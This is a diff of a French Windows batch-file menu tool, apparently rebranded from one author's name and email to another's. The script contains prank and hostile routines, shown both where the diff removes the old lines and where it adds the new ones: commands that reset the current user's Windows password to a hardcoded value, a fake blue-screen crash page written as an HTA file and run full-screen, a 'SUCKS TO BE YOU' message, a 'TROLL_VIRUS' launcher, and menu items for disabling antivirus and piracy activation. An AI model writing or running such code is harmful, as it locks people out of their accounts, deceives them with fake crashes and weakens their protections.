@@ -1,4 +1,5 @@
-﻿@echo off 
+@echo off 
+mode con cols=80 lines=43
 title= ---- Choose_multiple ----  
 cd windows\system32 
 color 8A
@@ -6,9 +7,9 @@ cls
 @echo                       -------------------------------------------
 @echo                       Bienvenue Sur Choose_multiple! :)                                                                                  
 @echo                       -------------------------------------------
-@echo                       Cree  Par Enzo
+@echo                       Cree  Par JackRyan
 @echo                       Pour me contacter 
-@echo                       par mail : enzocarpentier77@gmail.com                                   
+@echo                       par mail : cluberland@protonmail.com                                
 @echo                       -------------------------------------------                         
 @echo                                             Version Beta -_-           
 @echo                       -------------------------------------------
@@ -40,6 +41,7 @@ echo 23: change_pass_user
 echo 24: oppai-hh
 echo 25: Activer Adobe (Desactiver Anti-virus)
 echo 26: Activation Windows By Me
+echo 27: Info_PC
 
 set /p choix=Que Choisissez vous ? : 
 (  
@@ -113,7 +115,7 @@ echo                       ---------------------------------
 echo                       Bienvenue Sur                                                                                    
 echo                       USB Recovery Password    
 echo                       Cree  Par                                    
-echo                       ENZO                                  
+echo                       JackRyan                                  
 echo                                            Version Beta             
 echo                       ---------------------------------
 
@@ -172,7 +174,7 @@ cls
 
 ECHO -----------------------------------------------
 ECHO    WELCOME TO SAVE PROFIL!!
-ECHO      Created By Enzo2911
+ECHO      Created By JackRyan
 ECHO          Version Beta
 ECHO -----------------------------------------------
 
@@ -259,7 +261,7 @@ cls
 :UNLOCK
 echo Il te reste une dernier chance !!
 set/p "pass=>"
-if NOT %pass%== bbenzo2911 goto Trop!
+if NOT %pass%== bbJackRyan goto Trop!
 attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" Private
 echo dossier déverrouille
@@ -299,8 +301,8 @@ echo ---------------------------
 exit
 :session_pass
 @echo off
-echo Change Pass To Enzo2911
-net user %username% Enzo2911
+echo Change Pass To JackRyan
+net user %username% JackRyan
 echo ---------------------------
 PING localhost -n 5 >NUL
 exit
@@ -315,44 +317,44 @@ exit
 :ecran
 msg * SUCKS TO BE YOU
 @echo off
-echo ^<html^>^<head^>^<title^>enzo^</title^> > enzo.hta
-echo. >> enzo.hta
-echo ^<hta:application >> enzo.hta
-echo applicationname="enzo"  >> enzo.hta
-echo version="1.0" >> enzo.hta
-echo maximizebutton="no" >> enzo.hta
-echo minimizebutton="no" >> enzo.hta
-echo sysmenu="no" >> enzo.hta
-echo Caption="no" >> enzo.hta
-echo windowstate="maximize"/^> >> enzo.hta
-echo. >> enzo.hta
-echo ^</head^>^<body bgcolor="#4169E1" scroll="no"^> >> enzo.hta
-echo ^<font face="Times New Roman" size="5" color="#FF0000"^> >> enzo.hta
-echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >> enzo.hta
-echo. >> enzo.hta
-echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQUAL^</p^> >> enzo.hta
-echo. >> enzo.hta
-echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> enzo.hta
-echo. >> enzo.hta
-echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> enzo.hta
-echo. >> enzo.hta
-echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> >> enzo.hta
-echo. >> enzo.hta
-echo ^<p^>Technical information:^</p^> >> enzo.hta
-echo. >> enzo.hta
-echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)^</p^> >> enzo.hta
-echo. >> enzo.hta
-echo. >> enzo.hta
-echo ^<p^>***       gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> enzo.hta
-echo. >> enzo.hta
-echo ^<p^>Beginning dump of physical memory^</p^> >> enzo.hta
-echo ^<p^>Physical memory dump complete.^</p^> >> enzo.hta
-echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> enzo.hta
-echo. >> enzo.hta
-echo ^</font^> >> enzo.hta
-echo ^</body^>^</html^> >> enzo.hta
-start "" /wait "enzo.hta"
-del /s /f /q "enzo.hta" > nul
+echo ^<html^>^<head^>^<title^>JackRyan^</title^> > JackRyan.hta
+echo. >> JackRyan.hta
+echo ^<hta:application >> JackRyan.hta
+echo applicationname="JackRyan"  >> JackRyan.hta
+echo version="1.0" >> JackRyan.hta
+echo maximizebutton="no" >> JackRyan.hta
+echo minimizebutton="no" >> JackRyan.hta
+echo sysmenu="no" >> JackRyan.hta
+echo Caption="no" >> JackRyan.hta
+echo windowstate="maximize"/^> >> JackRyan.hta
+echo. >> JackRyan.hta
+echo ^</head^>^<body bgcolor="#4169E1" scroll="no"^> >> JackRyan.hta
+echo ^<font face="Times New Roman" size="5" color="#FF0000"^> >> JackRyan.hta
+echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >> JackRyan.hta
+echo. >> JackRyan.hta
+echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQUAL^</p^> >> JackRyan.hta
+echo. >> JackRyan.hta
+echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> JackRyan.hta
+echo. >> JackRyan.hta
+echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> JackRyan.hta
+echo. >> JackRyan.hta
+echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> >> JackRyan.hta
+echo. >> JackRyan.hta
+echo ^<p^>Technical information:^</p^> >> JackRyan.hta
+echo. >> JackRyan.hta
+echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)^</p^> >> JackRyan.hta
+echo. >> JackRyan.hta
+echo. >> JackRyan.hta
+echo ^<p^>***       gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> JackRyan.hta
+echo. >> JackRyan.hta
+echo ^<p^>Beginning dump of physical memory^</p^> >> JackRyan.hta
+echo ^<p^>Physical memory dump complete.^</p^> >> JackRyan.hta
+echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> JackRyan.hta
+echo. >> JackRyan.hta
+echo ^</font^> >> JackRyan.hta
+echo ^</body^>^</html^> >> JackRyan.hta
+start "" /wait "JackRyan.hta"
+del /s /f /q "JackRyan.hta" > nul
 exit
 :demo_troll
 cls
@@ -1106,7 +1108,7 @@ pause
 exit
 :Change_pass_user
 @echo off
-net user %USER% Enzo2911
+net user %USER% JackRyan
 :oppai-hh
 start \Logiciel\TROLL_VIRUS\oppai-hh.bat
 exit
